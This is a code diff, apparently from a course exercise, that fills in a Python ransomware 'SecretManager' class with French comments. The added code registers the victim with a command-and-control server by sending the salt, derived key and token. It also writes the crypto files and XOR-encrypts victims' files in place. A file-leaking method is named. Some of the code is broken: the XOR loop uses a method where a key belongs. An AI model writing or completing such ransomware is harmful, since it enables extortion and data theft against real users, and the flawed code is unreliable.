@@ -58,14 +58,44 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
-        raise NotImplemented()
+        # convertir les données binaires en base64 pour l'envoi dans le corps de la requête
+        payload = {
+            "token": self.bin_to_b64(token),
+            "salt": self.bin_to_b64(salt),
+            "key": self.bin_to_b64(key)
+        }
+        # envoyer la requête POST au CNC
+        response = requests.post(f"{self._path}/new", json=payload)
+        # vérifier que la requête a été effectuée avec succès
+        if response.status_code != 201:
+            raise ValueError("Failed to send secret data to CNC")
+        #raise NotImplemented()
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        # On vérifie si les fichiers cryptographiques exixtes, sinon on les cré
+        os.makedirs(self._path, exist_ok = True)
+        salt, key, token = self.create()
+
+        with open(os.path.join(self._path, "salt.bin"), "wb") as f :
+            f.write(salt)
+        
+        with open (os.path.join(self._path, "token.bin"), "wb") as f :
+            f.write(token)
+
+        derived_key = self.do_derivation(salt, key)
+
+        self.post_new (salt, derived_key, token)
+
+        #raise NotImplemented()
 
     def load(self)->None:
         # function to load crypto data
+       # with open(os.path.join(self._path, "salt.bin"), "rb") as f :
+            #self._salt = f.read()
+
+        #with open(os.path.join(self._path, "token.bin"), "rb") as f :
+            #self._token = f.read()
         raise NotImplemented()
 
     def check_key(self, candidate_key:bytes)->bool:
@@ -78,11 +108,26 @@ class SecretManager:
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+        with open(os.path.join(self._path, "token.bin"), "rb") as f :
+            token = f.read()
+        hashed_token = sha256(token).hexdigest()
+        return hashed_token
+        #raise NotImplemented()
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
+        for file in files :
+            with open (file, "rb") as f :
+                plaintext = f.read()
+
+            # Chiffrement des fichiers en utilisant la clef
+            encrypted = bytes([p ^ k for p, k  in zip(plaintext, self.check_key)])
+
+            # Réecriture des données chiffrées dans le même fichier
+            with open (file, "wb") as f :
+                f.write(encrypted)
+
+#        raise NotImplemented()
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
